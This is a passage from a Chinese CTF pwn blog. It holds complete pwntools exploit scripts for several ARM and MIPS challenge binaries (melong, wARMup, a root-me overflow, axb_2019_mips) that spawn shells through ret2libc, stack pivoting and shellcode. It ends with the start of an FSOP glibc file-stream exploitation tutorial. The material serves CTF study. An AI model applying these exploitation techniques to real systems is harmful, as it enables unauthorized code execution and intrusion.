sys</span><br><span class="line">context.binary = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./melong&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = 0xff6b6f98 - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">libc_base = <span class="number">0xff6bb770</span> - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload  = &#x27;A&#x27; * 0x54 + p32(0x00011bbc) + p32(elf.got[&#x27;puts&#x27;]) + p32(elf.plt[&#x27;puts&#x27;])#+p32(elf.sym[&#x27;main&#x27;])*2</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x54</span> + p32(<span class="number">0x00011bbc</span>) + p32(bin_addr) + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your height(meters) : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your weight(kilograms) : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How long do you want to take personal training?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Type the number:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h2><h3 id="基本情况-4"><a href="#基本情况-4" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位动态链接 arm 程序只打开了 nx 保护，存在 0x10 字节溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [sp+4h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to bi0s CTF!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">120u</span>);         <span class="comment">// 溢出0x10</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>长度是足够完成 ret2libc 操作，但是没有控制 r0 的 gadget ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171656.png" alt="image-20210123162353020"></p><p>这里思路是利用现有 gadget 控制 r3 为 bss 段上地址,利用 main 函数本身汇编代码调用 read 将 shellcode 写入到 bss 上。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171657.png" alt="image-20210123162740601"></p><p>构造写入 payload 问题不大：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>+p32(pop_r3_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br></pre></td></tr></table></figure><p>问题是在再次控制程序流到 bss 上，执行 shellocde 。这里通过调试发现 armeabi（32位arm）出栈时使用的汇编 <code>pop    &#123;fp, pc&#125;</code> （fp和r11是同一个寄存器）给 pc 赋值。这句汇编是<strong>将 fp 指向地址的值赋给 pc</strong> ，而这个 fp 类似于 ebp ，pc 等于 eip 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171658.png" alt="image-20210123171408650"><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171659.png" alt="image-20210123171453220"></p><blockquote><p>这里截图使用下面的 payload ，也就是 r11 的值是 bss+0x100</p></blockquote><p>如果我们用上面这个 payload 去打，当利用 main 函数内汇编调用完 read 后会继续运行到 main 结尾，也就是会再次调用 mian 结尾的出栈流程。由于之前 fp 被赋值为 <code>aaaa</code> ，所以程序会 <code>pop [fp,pc&#125;</code> 处报错，因为 0x61616161 不存在。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171700.png" alt="image-20210123171145355"></p><p>我们就利用这一点将 fp 覆盖为 bss 段，实现调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+p32(elf.bss()+<span class="number">0x100</span>)+p32(pop_r4_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br></pre></td></tr></table></figure><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>迁移完，要Shellcode 前面加个地址跳转</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./wARMup&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./wARMup&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./wARMup&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./wARMup&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">100</span><span class="comment">#104</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00010364</span></span><br><span class="line">main_read = <span class="number">0x00010530</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line">payload = padding*<span class="string">&#x27;a&#x27;</span>+p32(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_r3_pc)+p32(elf.bss()+<span class="number">0x100</span>)+p32(main_read)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(p32(elf.bss()+<span class="number">0x100</span>+<span class="number">0x4</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h2><h3 id="基本情况-5"><a href="#基本情况-5" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位动态链接 arm 程序，存在 scanf 函数溢出，程序自身泄露栈地址。</p><p>程序功能是可以重复向局部变量上写入，由于输入函数采用 scanf 长度被我们所控制。</p><p>思路是先获取程序泄露的栈地址，然后写入 shellcode 控制 pc 跳转执行。这里用 cycli 测出来的 padding 是 0x50 ，实际调试发现需要填充 0x54 ，0x50-0x54 被填充在 r11 (fp) 。</p><h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0xA0</span>,<span class="string">&#x27;\x90&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_addr)</span><br><span class="line"><span class="comment">#payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h2><blockquote><p>题目源码：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2019/blob/master/Pwn/mips">:link:</a></p></blockquote><h3 id="基本情况-6"><a href="#基本情况-6" class="headerlink" title="基本情况"></a>基本情况</h3><p>qemu-mipsel运行，提示缺少库，最快速的解决方法是下载现成的库，省去自己编译。Mipsel的uclibc库在这里<a href="https://github.com/MonkeyJacky/mipsel-linux-uclibc">https://github.com/MonkeyJacky/mipsel-linux-uclibc</a></p><p>vuln 函数里存在栈溢出。</p><p>$fp寄存器的值，在我们溢出后函数结束时，就会被栈里的值覆盖，因此,$fp可控，从而$v0可控，从而$a1可控。而$a0、$a2也在代码里控制住了。因此,我们让$a1指向bss段，从而可以向bss段输入shellcode。当read结束后, move  $sp, $fp指令会使得栈发生迁移，我们在bss段的shellcode前面放置shellcode的地址，，这样shellcode的地址就会被放入到$ra寄存器，进而可以ret到shellcode。</p><h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;pwn2&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">28110</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-uclibc&quot;</span>, <span class="string">&quot;pwn2&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-uclibc&quot;</span>, <span class="string">&quot;pwn2&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;pwn2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/mipsel-linux-uclibc/lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">36</span></span><br><span class="line">bss = <span class="number">0x410B70</span></span><br><span class="line">text_read = <span class="number">0x4007E0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.bss()))</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ret2shellcode</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>)</span><br><span class="line"><span class="comment">#fp</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> - <span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#调用read向bss段输入shellcode，然后ret到bss段</span></span><br><span class="line">payload += p32(text_read)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span>     <span class="comment">#12</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> + <span class="number">0x28</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gadget1</span></span><br><span class="line"><span class="string">payload = &#x27;a&#x27;*padding</span></span><br><span class="line"><span class="string">payload += p32(0x004006C8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload += p32(elf.plt[&#x27;puts&#x27;])# fp</span></span><br><span class="line"><span class="string">payload += p32(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &quot;a&quot; * 0x18</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27; * 4 # s0</span></span><br><span class="line"><span class="string">#payload += p32(elf.got[&#x27;puts&#x27;]) # s1</span></span><br><span class="line"><span class="string">payload += p32(0x00410B58)</span></span><br><span class="line"><span class="string">payload += p32(0x0040092C) # s2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27; * 4 # s3</span></span><br><span class="line"><span class="string">payload += p32(0x004007A4) # ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*0x20</span></span><br><span class="line"><span class="string">payload += p32(0x004007C4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recv()</span></span><br><span class="line"><span class="string">#success(a)</span></span><br><span class="line"><span class="string">libc_addr = u32(p.recv(4))-libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">success(&quot;libc_addr: &quot; + hex(libc_addr))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recv()</span></span><br><span class="line"><span class="string">#p.send(payload)</span></span><br><span class="line"><span class="string">system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_addr + 0x9bc48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gadget2</span></span><br><span class="line"><span class="string">payload = &#x27;a&#x27;*0x24</span></span><br><span class="line"><span class="string">payload += p32(0x004006C8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*0x1c</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*4 #s0</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr)</span></span><br><span class="line"><span class="string">payload += p32(system_addr)</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*4</span></span><br><span class="line"><span class="string">payload += p32(0x004007A4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/seaaseesa/article/details/105281585">mips&amp;arm&amp;aarch64-pwn初探</a></li><li><a href="https://ctf-wiki.org/pwn/linux/arm/arm_rop/">arm - ROP</a></li><li><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></li><li><a href="https://www.lyyl.online/2020/10/09/MIPS-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B0%83%E8%AF%95/">MIPS 环境搭建及调试</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ARM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSOP</title>
      <link href="archives/ed4b4a2a/"/>
      <url>archives/ed4b4a2a/</url>
      
        <content type="html"><![CDATA[<h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用 _chain 域相互连接形成一个链表，这个链表的头部由 _IO_list_all 维护。</p><p>FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 _IO_flush_all_lockp，这个函数会刷新 _IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的 _IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201208193856.jpeg" alt="img"></p><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201208195441.png" alt="image-20201208195441734"></p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为 _IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写 _IO_list_all。</p><p>之后需要用任意地址写把 _IO_list_all 的内容改为指向我们可控内存的指针，</p><p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result &#x3D; EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>也就是</p><ul><li>fp-&gt;_mode &lt;= 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 